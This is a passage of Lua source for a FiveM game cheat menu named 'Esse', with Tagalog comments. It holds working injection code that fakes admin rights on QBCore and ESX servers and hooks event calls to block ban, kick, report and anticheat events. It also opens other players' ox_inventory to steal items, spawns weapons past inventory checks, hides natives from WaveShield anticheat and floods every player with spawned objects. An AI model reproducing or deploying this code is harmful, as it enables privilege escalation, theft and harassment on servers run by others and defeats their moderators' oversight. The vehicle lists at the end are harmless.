                        if DoesEntityExist(ped) then
                            local pos = GetEntityCoords(ped)
                            local ball = CreateObject(GetHashKey("prop_beachball_02"), pos.x, pos.y, pos.z, true, true, true)
                            SetEntityAsNoLongerNeeded(ball)
                        end
                    end
                end
            end)
        ]])
                                else
                                    Esse:Notify("error", "CHAOS", "Esse Chaos STOPPED! Cleaning up...", 5000)
                                    MachoInjectResourceRaw("monitor", [[
            _G.ChaosActive = false
        ]])
                                end
                            end
                        },


                        {
                            type = "checkbox",
                            label = "Rain Ballen",
                            desc =
                            'Spawns humpback whales (or selected model) repeatedly on all players. Use checkbox to stop.',
                            icon = "ph-cuffs",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    Esse:Notify("warning", "Rain Ballen", "Ballen rain STARTED! Uncheck to stop.",
                                        4000)

                                    MachoInjectResourceRaw("any", [[
            _G.RainBallenActive = true
            local pedModel = "a_c_humpback"  -- Fixed model name (lowercase, humpback whale)

            -- Preload model
            RequestModel(pedModel)
            while not HasModelLoaded(pedModel) do Wait(100) end

            -- Thread para sa pag-spawn
            Citizen.CreateThread(function()
                while _G.RainBallenActive do
                    local playerList = GetActivePlayers()
                    for _, playerId in ipairs(playerList) do
                        if not _G.RainBallenActive then break end
                        local ped = GetPlayerPed(playerId)
                        if DoesEntityExist(ped) then
                            local pos = GetEntityCoords(ped)
                            local heading = GetEntityHeading(ped)
                            local entity = CreatePed(28, pedModel, pos.x, pos.y, pos.z, heading, true, false)
                            if DoesEntityExist(entity) then
                                SetEntityAsMissionEntity(entity, true, true)
                                TaskWanderInArea(entity, pos.x, pos.y, pos.z, 10.0, 10.0, 10.0)
                                SetPedAsNoLongerNeeded(entity)
                            end
                        end
                    end
                    Wait(350)
                end
                -- Cleanup: set model as no longer needed pag tapos
                SetModelAsNoLongerNeeded(pedModel)
            end)
        ]])
                                else
                                    Esse:Notify("error", "Rain Ballen", "Ballen rain STOPPED. No new spawns.",
                                        4000)
                                    MachoInjectResourceRaw("any", [[
            _G.RainBallenActive = false
        ]])
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Flag On Everyone",
                            desc = 'this will attach palestine flag on all',
                            icon = "ph-cuffs",
                            onSelect = function()
                                MachoInjectResourceRaw('any', [[

        local flagModel = "apa_prop_flag_palestine"
        local flagAttached = false

        Citizen.CreateThread(function()
            RequestModel(flagModel)

            while not HasModelLoaded(flagModel) do
                Wait(0)
            end

            while true do
                if not flagAttached then
                    local playerList = GetActivePlayers()
                    local ped = GetPlayerPed(-1)
                    local pos = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)

                    for _, playerId in ipairs(playerList) do
                        local playerPed = GetPlayerPed(playerId)

                        local boneIndex = GetPedBoneIndex(playerPed, 31086)

                        local flagEntity = CreateObject(GetHashKey(flagModel), pos.x, pos.y, pos.z, true, false, true)
                        AttachEntityToEntity(flagEntity, playerPed, boneIndex, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                        flagAttached = true
                    end
                end

                Citizen.Wait(0)
            end
        end)

    ]])
                            end
                        },

                        {
                            type = "divider",
                            label = "QB & ESX"
                        },



                        {
                            type = "button",
                            label = "Admin Menu (QBCore)",
                            desc = 'Opens admin menu without getting kicked (bypasses permission check)',
                            icon = "ph-cuffs",
                            onSelect = function()
                                Esse:Notify("info", "Admin Menu",
                                    "Attempting to open admin menu (bypass active)...", 3000)

                                -- I-inject ang bypass sa qb-core bago buksan ang menu
                                MachoInjectResourceRaw("any", [[
        -- 1. I-hook ang permission check para laging true
        local QBCore = exports['qb-core']:GetCoreObject()
        if QBCore then
            -- I-save ang original functions
            local originalHasPermission = QBCore.Functions.HasPermission
            local originalGetPlayerData = QBCore.Functions.GetPlayerData

            -- I-override ang HasPermission
            QBCore.Functions.HasPermission = function(permission)
                return true
            end

            -- I-override ang GetPlayerData para magmukhang admin
            QBCore.Functions.GetPlayerData = function()
                local data = originalGetPlayerData()
                if data then
                    data.permissions = { 'admin', 'god' }
                    data.groups = { ['admin'] = 1, ['god'] = 1 }
                    data.job = { name = 'police', grade = 5 }
                end
                return data
            end

            -- I-set ang player state (kung ginagamit ng menu)
            if LocalPlayer and LocalPlayer.state then
                LocalPlayer.state:set('isLoggedIn', true, true)
                LocalPlayer.state:set('permissions', { 'admin' }, true)
                LocalPlayer.state:set('job', { name = 'police', grade = 5 }, true)
            end

            -- Bukas ang admin menu
            TriggerEvent('qb-admin:client:openMenu', nil, 'admin', nil)

            -- I-restore ang original functions pagkatapos ng 5 seconds (o pwedeng iwan)
            Citizen.SetTimeout(10000, function()
                QBCore.Functions.HasPermission = originalHasPermission
                QBCore.Functions.GetPlayerData = originalGetPlayerData
                print("[Esse] Admin menu bypass restored.")
            end)
        else
            print("[Esse] QBCore not found, fallback to direct trigger")
            TriggerEvent('qb-admin:client:openMenu')
        end
    ]])

                                -- Optional: magbigay ng notification na gumagana
                                Citizen.SetTimeout(2000, function()
                                    Esse:Notify("success", "Admin Menu",
                                        "Menu should be open. If kicked, server has additional checks.", 5000)
                                end)
                            end
                        },

                        {
                            type = "button",
                            label = "Admin Menu (ESX)",
                            desc = 'Attempts to open various admin menus on ESX servers with permission bypass',
                            icon = "ph-cuffs",
                            onSelect = function()
                                Esse:Notify("info", "Admin Menu (ESX)", "Attempting to open admin menu...", 3000)

                                -- I-inject ang bypass at triggers sa ESX environment
                                MachoInjectResourceRaw("any", [[
        -- Wait for ESX to be available
        local ESX = nil
        while ESX == nil do
            TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
            Citizen.Wait(100)
        end

        -- 1. I-hijack ang ESX player data para magkaroon ng admin group
        local playerData = ESX.GetPlayerData()
        if playerData then
            -- I-save ang original groups
            local originalGroups = playerData.groups
            -- I-set ang sarili bilang admin
            playerData.groups = { ['admin'] = 1, ['superadmin'] = 1, ['mod'] = 1 }
            playerData.job = { name = 'police', grade = 5, label = 'Police' }
            playerData.job2 = { name = 'police', grade = 5 }
            playerData.permissions = { 'admin', 'god' }

            -- I-hook ang ESX.GetPlayerData para laging may admin groups
            local originalGetPlayerData = ESX.GetPlayerData
            ESX.GetPlayerData = function()
                local data = originalGetPlayerData()
                if data then
                    data.groups = { ['admin'] = 1, ['superadmin'] = 1, ['mod'] = 1 }
                    data.job = { name = 'police', grade = 5, label = 'Police' }
                    data.permissions = { 'admin', 'god' }
                end
                return data
            end
        end

        -- 2. I-override ang permission checks
        if ESX then
            -- I-hook ang ESX.PlayerData para laging admin
            local function spoofGroups()
                if ESX.PlayerData then
                    ESX.PlayerData.groups = { ['admin'] = 1, ['superadmin'] = 1, ['mod'] = 1 }
                    ESX.PlayerData.job = { name = 'police', grade = 5, label = 'Police' }
                    ESX.PlayerData.permissions = { 'admin', 'god' }
                end
            end
            spoofGroups()
            -- I-execute every few seconds para hindi ma-overwrite
            Citizen.CreateThread(function()
                while true do
                    Citizen.Wait(2000)
                    spoofGroups()
                end
            end)
        end

        -- 3. I-hook ang ESX.GetPlayerData
        local origGetPlayerData = ESX.GetPlayerData
        ESX.GetPlayerData = function(cb)
            local data = origGetPlayerData(cb)
            if data then
                data.groups = { ['admin'] = 1, ['superadmin'] = 1, ['mod'] = 1 }
                data.job = { name = 'police', grade = 5, label = 'Police' }
                data.permissions = { 'admin', 'god' }
            end
            return data
        end

        -- 4. I-hook ang TriggerEvent at TriggerServerEvent para hindi ma-ban
        local originalTriggerEvent = TriggerEvent
        local originalTriggerServerEvent = TriggerServerEvent

        TriggerEvent = function(event, ...)
            -- I-block ang mga events na pwedeng mag-report sa admin
            local blockedEvents = {
                'esx:report', 'admin:report', 'anticheat:detected',
                'esx:ban', 'admin:ban', 'kick'
            }
            for _, ev in ipairs(blockedEvents) do
                if event:lower():find(ev) then
                    return
                end
            end
            return originalTriggerEvent(event, ...)
        end

        TriggerServerEvent = function(event, ...)
            -- I-block ang mga server events na pwedeng magpa-ban
            local lowerEvent = event:lower()
            if lowerEvent:find('report') or lowerEvent:find('detect') or
                lowerEvent:find('ban') or lowerEvent:find('kick') or
                lowerEvent:find('admin') then
                return
            end
            return originalTriggerServerEvent(event, ...)
        end

        -- 5. Subukan ang lahat ng posibleng admin menu triggers
        local menuEvents = {
            -- Common ESX admin menu events
            'esx_admin:openMenu',
            'esx_admin:open',
            'admin:openMenu',
            'adminmenu:open',
            'esx:openAdminMenu',
            'esx_adminmenu:open',
            'admin:open',
            'admin_panel:open',
            'esx_admin_panel:open',
            'admin:menu',
            'esx:admin',
            -- RageUI / NativeUI admin menus
            'esx:openMenu',
            'admin:showMenu',
            'esx:showAdminMenu',
            -- Third-party admin menus
            'ps-adminmenu:open',
            'wasabi-admin:open',
            'kd-admin:open',
            'vadmin:open',
            'easyadmin:open',
            'dolu_admin:open'
        }

        for _, event in ipairs(menuEvents) do
            pcall(function()
                TriggerEvent(event, nil, 'admin', nil)
            end)
        end

        -- 6. Subukan ang command-based admin menus
        local commands = {
            '/admin', '/adminmenu', '/adminpanel', '/staff', '/mod',
            '/ad', '/adm', '/a', '/admin_panel', '/openadmin', '/esx_admin'
        }
        for _, cmd in ipairs(commands) do
            pcall(function()
                ExecuteCommand(cmd)
            end)
        end

        -- 7. Subukan ang key-based (madalas F1, F2, F3, F8)
        local keys = { 288, 289, 290, 291, 292, 293, 294, 295, 296 } -- F1-F9
        for _, key in ipairs(keys) do
            SetControlValue(0, key, 1)
            Citizen.Wait(50)
            SetControlValue(0, key, 0)
        end

        print("[Esse] ESX Admin Menu bypass attempted.")
    ]])

                                Wait(1000)
                                Esse:Notify("success", "Admin Menu (ESX)",
                                    "Attempted to open admin menu. Check if menu appeared or try again.", 5000)
                            end
                        },

                        {
                            type = "divider",
                            label = "Inventory Exploit"
                        },
                        {
                            type = "button",
                            label = "Steal Inventory (ox_inventory)",
                            desc = "Steal target player's inventory via ox_inventory (teleport + disguise)",
                            onSelect = function()
                                -- Kunin ang napiling player mula sa CPlayers
                                local targetServerId = nil
                                for sid, checked in pairs(CPlayers) do
                                    if checked then
                                        targetServerId = sid
                                        break
                                    end
                                end

                                if not targetServerId then
                                    Esse:Notify("error", "Steal Inventory",
                                        "Please select a player from the list first!", 4000)
                                    return
                                end

                                Esse:Notify("info", "Steal Inventory",
                                    "Attempting to steal from " .. targetServerId .. "...", 3000)

                                CreateThread(function()
                                    -- I-inject ang steal logic sa ox_inventory resource (kung started)
                                    if GetResourceState("ox_inventory") ~= "started" then
                                        Esse:Notify("error", "Steal Inventory",
                                            "ox_inventory is not running on this server.", 4000)
                                        return
                                    end

                                    -- Gamitin ang MachoInjectResource2 (katulad ng original)
                                    MachoInjectResource2("AsThreadNs", "ox_inventory", string.format([[
            local tid = %d
            local myPed = PlayerPedId()

            -- Hanapin ang target player index
            local targetPlayer = -1
            local pList = GetActivePlayers()
            for i=1, #pList do
                if GetPlayerServerId(pList[i]) == tid then
                    targetPlayer = pList[i]
                    break
                end
            end

            if targetPlayer == -1 then
                print("[Steal Inventory] Target not found")
                return
            end

            local tPed = GetPlayerPed(targetPlayer)
            if not tPed or not DoesEntityExist(tPed) then
                print("[Steal Inventory] Target ped invalid")
                return
            end

            -- I-save ang original position at visibility
            local oldPos = GetEntityCoords(myPed)
            local oldHead = GetEntityHeading(myPed)
            local tPos = GetEntityCoords(tPed)
            local tForward = GetEntityForwardVector(tPed)

            -- Teleport sa likod ng target (invisible)
            SetEntityCoords(myPed, tPos.x - (tForward.x * 0.8), tPos.y - (tForward.y * 0.8), tPos.z - 1.0, false, false, false, false)
            SetEntityVisible(myPed, false, false)
            SetEntityAlpha(myPed, 0, false)
            SetEntityInvincible(myPed, true)
            FreezeEntityPosition(myPed, true)

            Wait(450)

            -- I-hijack ang player data para magmukhang may permission (kung kailangan)
            local PD = PlayerData or _G.PlayerData
            local oldGroups = nil
            if PD then
                oldGroups = PD.groups
                PD.groups = { ["police"] = 1 }  -- ginagaya ang police group
            end

            -- Buksan ang inventory ng target
            exports.ox_inventory:openInventory('player', tid)

            -- Maghintay hanggang sa maisara ang inventory (NUI focused)
            while IsNuiFocused() do
                Wait(500)
            end

            -- Ibalik ang lahat
            SetEntityCoords(myPed, oldPos.x, oldPos.y, oldPos.z, false, false, false, false)
            SetEntityHeading(myPed, oldHead)
            SetEntityVisible(myPed, true, false)
            ResetEntityAlpha(myPed)
            SetEntityInvincible(myPed, false)
            FreezeEntityPosition(myPed, false)

            if PD and oldGroups then
                PD.groups = oldGroups
            end

            -- Notify success (sa console)
            print("[Steal Inventory] Successfully stole from " .. tid)
        ]], targetServerId))

                                    -- Maghintay ng konti para magawa ang injection, then notify
                                    Wait(1000)
                                    Esse:Notify("success", "Steal Inventory",
                                        "Inventory opened! Close it to return to your position.", 5000)
                                end)
                            end
                        },

                        {
                            type = "divider",
                            label = "Other"
                        },

                    }
                },
            }
        },
        {
            icon = "",
            label = "Weapon",
            type = "subMenu",
            categories = {
                {
                    label = "Spawner",
                    tabs = {


                        {
                            type = "button",
                            label = "Spawn Weapon",
                            desc = "Spawn weapon in hand (might be detected on some servers)",
                            onSelect = function()
                                KeyboardInput("Weapon Name", "weapon_pistol", function(rawInput)
                                    if not rawInput or rawInput == "" then return end
                                    local weaponName = string.upper(rawInput)
                                    if not weaponName:find("WEAPON_") then weaponName = "WEAPON_" .. weaponName end

                                    -- Gamiting ang existing at working spawn function
                                    Esse:SpawnSelectedWeapon(weaponName)
                                end, "typeable")
                            end
                        },



                        -- Bagong Spoof Weapon button
                        {
                            type = "button",
                            label = "Spoof Spawn Weapon",
                            desc = "Spawn weapon in hand using spoof method (bypasses Ox Inventory)",
                            onSelect = function()
                                KeyboardInput("Weapon Name", "weapon_pistol", function(rawInput)
                                    if not rawInput or rawInput == "" then return end
                                    local weaponName = string.upper(rawInput)
                                    if not weaponName:find("WEAPON_") then weaponName = "WEAPON_" .. weaponName end

                                    self:Notify("info", "Esse", "Spawning " .. weaponName, 3000)

                                    -- Gamitin ang injection method na katulad ng sa iyong code
                                    MachoInjectResource2("AsThreadNs", "any", string.format([[
                            local name = "%s"
                            local hash = GetHashKey(name)

                            -- I‑override ang Weapon module kung meron (ox_inventory style)
                            pcall(function()
                                local Weapon = require 'modules.weapon.client'
                                if Weapon then
                                    Weapon.Disarm = function() return currentWeapon end
                                    Weapon.ClearAll = function() end
                                end
                            end)

                            currentWeapon = {
                                name = name,
                                hash = hash,
                                metadata = { durability = 100, registered = true },
                                ammo = 500
                            }

                            local ped = PlayerPedId()
                            GiveWeaponToPed(ped, hash, 500, false, true)
                            SetCurrentPedWeapon(ped, hash, true)

                            -- I‑reset ang ilang state variables (kung ginagamit ng server)
                            LocalPlayer.state:set('canUseWeapons', true, true)
                            LocalPlayer.state:set('invBusy', false, true)
                        ]], weaponName))

                                    self:Notify("success", "Esse", weaponName .. " spawned via spoof!", 4000)
                                end, "typeable")
                            end
                        },
                        -- Remove Spoofed Weapon
                        {
                            type = "button",
                            label = "Remove Spoofed Weapon",
                            desc = "Remove the last spoofed weapon",
                            onSelect = function()
                                self:Notify("info", "Esse", "Removing spoofed weapon...", 3000)
                                MachoInjectResource2("AsThreadNs", "any", [[
                        local ped = PlayerPedId()
                        local weapon = GetSelectedPedWeapon(ped)
                        if weapon ~= GetHashKey("WEAPON_UNARMED") then
                            RemoveWeaponFromPed(ped, weapon)
                            SetCurrentPedWeapon(ped, GetHashKey("WEAPON_UNARMED"), true)
                            currentWeapon = nil
                        end
                    ]])
                                self:Notify("success", "Esse", "Spoofed weapon removed!", 3000)
                            end
                        }
                    }
                },
                {
                    label = "Combat",
                    tabs = {
                        {
                            type = "checkbox",
                            label = "Infinite Ammo ",
                            desc = "Infinite Ammo, this might be detected on certain servers",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    self:Notify("success", "Esse", "Enabled Infinite Ammo", 5000)
                                    self:EnableInfiniteAmmo()
                                else
                                    self:Notify("error", "Esse", "Disabled Infinite Ammo", 5000)
                                    self:DisableInfiniteAmmo()
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Headshot",
                            checked = false,
                            desc = "This will prevent you from being headshot.",
                            onSelect = function(checked)
                                if checked then
                                    self:Notify("success", "Esse", "Enabled Anti-Headshot", 5000)
                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor"
                                            or GetResourceState("ox_lib") == "started" and "ox_lib"
                                            or "any", [[
                                        local function decode(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function g(n) return _G[decode(n)] end

                                        -- native wrappers (obfuscated lookup style)
                                        local SetPedSuffersCriticalHits = g({83,101,116,80,101,100,83,117,102,102,101,114,115,67,114,105,116,105,99,97,108,72,105,116,115})
                                        local PlayerPedId_fn = g({80,108,97,121,101,114,80,101,100,73,100})
                                        local Wait_fn = g({87,97,105,116})

                                        if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                        if not _G.antiHeadshotEnabled then
                                            _G.antiHeadshotEnabled = true

                                            -- initFlow (coroutine runner) — copy of your project's coroutine runner pattern
                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local function execCycle()
                                                    while coroutine.status(co) ~= "dead" do
                                                        local ok, err = coroutine.resume(co)
                                                        if not ok then
                                                            break
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end
                                                execCycle()
                                            end

                                            initFlow(function()
                                                while _G.antiHeadshotEnabled and not Unloaded do
                                                    local ped = PlayerPedId_fn()
                                                    if ped and ped ~= 0 then
                                                        SetPedSuffersCriticalHits(ped, false)
                                                    end
                                                    Wait_fn(0)
                                                end
                                            end)
                                        end
                                    ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                        if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                        if not _G.antiHeadshotEnabled then
                                            _G.antiHeadshotEnabled = true

                                            local CreateThread_fn = CreateThread
                                            local Wait_fn = Wait
                                            local PlayerPedId_fn = PlayerPedId
                                            local SetPedSuffersCriticalHits_fn = SetPedSuffersCriticalHits

                                            CreateThread_fn(function()
                                                while true do
                                                    Wait_fn(0)
                                                    if not _G.antiHeadshotEnabled then
                                                        Wait_fn(500)
                                                        goto continue
                                                    end

                                                    local ped = PlayerPedId_fn()
                                                    if ped and ped ~= 0 then
                                                        SetPedSuffersCriticalHits_fn(ped, false)
                                                    end

                                                    ::continue::
                                                end
                                            end)
                                        end
                                        _G.antiHeadshotEnabled = true
                                    ]])
                                    end
                                else
                                    self:Notify("error", "Esse", "Disabled Anti-Headshot", 5000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor"
                                            or GetResourceState("ox_lib") == "started" and "ox_lib"
                                            or "any",
                                            [[
                                        -- simply clear the flag; coroutine loop will stop
                                        if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                        _G.antiHeadshotEnabled = false
                                    ]])
                                    else
                                        Injection("any", [[
                                        if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                        _G.antiHeadshotEnabled = false

                                        -- try to restore default behavior once (best-effort)
                                        if PlayerPedId and SetPedSuffersCriticalHits then
                                            local ped = PlayerPedId()
                                            if ped and ped ~= 0 then
                                                pcall(function() SetPedSuffersCriticalHits(ped, true) end)
                                            end
                                        end
                                    ]])
                                    end
                                end
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Vehicle Exploits",
            type = "subMenu",
            categories = {
                {
                    label = "Spawner",
                    tabs = {
                        {
                            type = "checkbox",
                            label = "Teleport Into",
                            desc = "If selected, this will teleport you into the selected vehicle.",
                            checked = false,
                            onSelect = function(checked)
                                TeleportInto = checked or false
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Delete Previous",
                            desc =
                            "If selected, this will delete your previous vehicle when spawning selected vehicle.",
                            checked = false,
                            onSelect = function(checked)
                                DeletePrevious = checked or false
                            end
                        },
                        { type = "divider", label = "All Vehicles" },
                        {
                            type = "button",
                            label = "Addon",
                            onSelect = function()
                                KeyboardInput("Addon Vehicle", "", function(val)
                                    if val and val ~= "" then
                                        self:SpawnSelectedVehicle(val, TeleportInto, DeletePrevious)
                                    end
                                end, "typeable")
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Compacts",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "asbo", "blista", "brioso", "brioso2", "brioso3", "club", "dilettante", "dilettante2", "issi2", "issi3", "issi4", "issi5", "issi6", "kanjo", "panto", "prairie", "rhapsody", "weevil" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sedans",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "asea", "asea2", "asterope", "asterope2", "cinquemila", "driftchavosv6", "cog55", "cog552", "cognoscenti", "cognoscenti2", "deity", "hardy", "drifthardy", "emperor", "emperor2", "emperor3", "fugitive", "glendale", "glendale2", "impaler5", "ingot", "intruder", "minimus", "limo2", "premier", "primo", "primo2", "regina", "rhinehart", "romero", "schafter2", "schafter5", "schafter6", "stafford", "stanier", "stratum", "stretch", "superd", "surge", "tailgater", "tailgater2", "warrener", "warrener2", "washington" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "SUVs",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "aleutian", "astron", "baller", "baller2", "baller3", "baller4", "baller5", "baller6", "baller7", "baller8", "bjxl", "cavalcade", "cavalcade2", "cavalcade3", "contender", "dorado", "dubsta", "dubsta2", "everon3", "fq2", "granger", "granger2", "gresley", "habanero", "huntley", "issi8", "iwagen", "jubilee", "landstalker", "landstalker2", "mesa", "mesa2", "novak", "patriot", "patriot2", "radi", "rebla", "rocoto", "seminole", "seminole2", "serrano", "squaddie", "toros", "vivanite", "woodlander", "xls", "xls2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Coupes",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "cogcabrio", "driftfr36", "exemplar", "f620", "felon", "felon2", "fr36", "jackal", "kanjosj", "oracle", "oracle2", "postlude", "previon", "sentinel", "sentinel2", "windsor", "windsor2", "zion", "zion2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Muscles",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "blade", "brigham", "broadway", "buccaneer", "buccaneer2", "buffalo4", "buffalo5", "chino", "chino2", "clique", "clique2", "coquette3", "deviant", "dominator", "dominator2", "dominator3", "dominator4", "dominator5", "dominator6", "dominator7", "dominator8", "dominator9", "driftdominator10", "driftyosemite", "dukes", "dukes2", "dukes3", "ellie", "eudora", "faction", "faction2", "faction3", "gauntlet", "gauntlet2", "gauntlet3", "gauntlet4", "gauntlet5", "driftgauntlet4", "greenwood", "hermes", "hotknife", "hustler", "impaler", "impaler2", "impaler3", "impaler4", "impaler6", "imperator", "imperator2", "imperator3", "lurcher", "manana2", "moonbeam", "moonbeam2", "nightshade", "peyote2", "phoenix", "picador", "ratloader", "ratloader2", "ruiner", "ruiner2", "ruiner3", "ruiner4", "sabregt", "sabregt2", "slamvan", "slamvan2", "slamvan3", "slamvan4", "slamvan5", "slamvan6", "stalion", "stalion2", "tahoma", "tampa", "tampa3", "tampa4", "tulip", "tulip2", "vamos", "vigero", "vigero2", "vigero3", "virgo", "virgo2", "virgo3", "voodoo", "voodoo2", "weevil2", "yosemite", "yosemite2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sports Classic",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "ardent", "btype", "btype2", "btype3", "casco", "cheburek", "cheetah2", "cheetah3", "coquette2", "deluxo", "dynasty", "fagaloa", "feltzer3", "gt500", "infernus2", "jb700", "jb7002", "mamba", "manana", "michelli", "monroe", "nebula", "peyote", "peyote3", "pigalle", "rapidgt3", "retinue", "retinue2", "savestra", "stinger", "stingergt", "stromberg", "swinger", "toreador", "torero", "tornado", "tornado2", "tornado3", "tornado4", "tornado5", "tornado6", "turismo2", "viseris", "z190", "zion3", "ztype" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sports",
                            type = "scrollable",
                            value = 1,
                            values = { "alpha", "banshee", "bestiagts", "blista2", "blista3", "buffalo", "buffalo2", "buffalo3", "calico", "carbonizzare", "comet2", "comet3", "comet4", "comet5", "comet6", "comet7", "coquette", "coquette4", "corsita", "coureur", "cypher", "drafter", "drifteuros", "driftfuto", "driftjester", "driftremus", "drifttampa", "driftzr350", "elegy", "elegy2", "euros", "everon2", "feltzer2", "flashgt", "furoregt", "fusilade", "futo", "futo2", "gauntlet6", "gb200", "growler", "hotring", "imorgon", "issi7", "italigto", "italirsx", "jester", "jester2", "jester3", "jester4", "jugular", "khamelion", "komoda", "kuruma", "kuruma2", "locust", "lynx", "massacro", "massacro2", "neo", "neon", "ninef", "ninef2", "omnis", "omnisegt", "panthere", "paragon", "paragon2", "pariah", "penumbra", "penumbra2", "r300", "raiden", "rapidgt", "rapidgt2", "rapidgt4", "raptor", "remus", "revolter", "rt3000", "ruston", "schafter3", "schafter4", "schlagen", "schwarzer", "sentinel3", "sentinel4", "sentinel5", "seven70", "sm722", "specter", "specter2", "stingertt", "streiter", "sugoi", "sultan", "sultan2", "sultan3", "surano", "tampa2", "tenf", "tenf2", "tropos", "vectre", "verlierer2", "veto", "veto2", "vstr", "zr350", "zr380", "zr3802", "zr3803" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Super",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "adder", "autarch", "banshee2", "bullet", "champion", "cheetah", "cyclone", "deveste", "emerus", "entity2", "entity3", "entityxf", "fmj", "furia", "gp1", "ignus", "infernus", "italigtb", "italigtb2", "krieger", "le7b", "lm87", "nero", "nero2", "osiris", "penetrator", "pfister811", "prototipo", "reaper", "s80", "sc1", "scramjet", "sheava", "sultanrs", "suzume", "t20", "taipan", "tempesta", "tezeract", "thrax", "tigon", "torero2", "turismo3", "turismor", "tyrant", "tyrus", "vacca", "vagner", "vigilante", "virtue", "visione", "voltic", "voltic2", "xa21", "zeno", "zentorno", "zorrusso" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Motorcycles",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "akuma", "avarus", "bagger", "bati", "bati2", "bf400", "carbonrs", "chimera", "cliffhanger", "daemon", "daemon2", "deathbike", "deathbike2", "deathbike3", "defiler", "diablous", "diablous2", "double", "enduro", "esskey", "faggio", "faggio2", "faggio3", "fcr", "fcr2", "gargoyle", "hakuchou", "hakuchou2", "Esseer", "innovation", "lectro", "manchez", "manchez2", "manchez3", "nemesis", "nightblade", "oppressor", "oppressor2", "pcj", "powersurge", "ratbike", "reever", "rrocket", "ruffian", "sanchez", "sanchez2", "sanctus", "shinobi", "shotaro", "sovereign", "stryder", "thrust", "vader", "vindicator", "vortex", "wolfsbane", "zombiea", "zombieb" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Off-Road",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bfinjection", "bifta", "blazer", "blazer2", "blazer3", "blazer4", "blazer5", "bodhi2", "boor", "brawler", "bruiser", "bruiser2", "bruiser3", "brutus", "brutus2", "brutus3", "caracara", "caracara2", "dloader", "draugur", "driftl352", "dubsta3", "dune", "dune2", "dune3", "dune4", "dune5", "freecrawler", "hellion", "insurgent", "insurgent2", "insurgent3", "kalahari", "kamacho", "l35", "l352", "marshall", "menacer", "mesa3", "monster", "monster3", "monster4", "monster5", "monstrociti", "nightshark", "outlaw", "patriot3", "rancherxl", "rancherxl2", "ratel", "rcbandito", "rebel", "rebel2", "riata", "sandking", "sandking2", "technical", "technical2", "technical3", "terminus", "trophytruck", "trophytruck2", "vagrant", "verus", "winky", "yosemite3", "zhaba" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Industrial",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bulldozer", "cutter", "dump", "flatbed", "flatbed2", "guardian", "handler", "mixer", "mixer2", "rubble", "tiptruck", "tiptruck2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Utility",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
